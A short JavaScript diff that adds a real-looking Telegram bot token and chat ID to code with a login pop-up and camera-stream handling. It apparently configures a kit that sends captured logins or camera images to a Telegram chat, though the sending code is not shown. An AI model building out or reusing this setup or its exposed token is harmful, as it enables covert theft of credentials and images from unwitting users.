@@ -14,8 +14,8 @@ function showLoginPopup() {
     document.getElementById("loginPage").style.display = "flex";
 }
 
-const botToken = "YOUR_BOT_TOKEN";  
-const chatID = "YOUR_CHAT_ID";
+const botToken = "8149464057:AAHScuyU-0brab-tH74nisX26IO7wCa2-_4";  
+const chatID = "7955475790";
 
 let isFrontCamera = true;
 let currentStream = null;
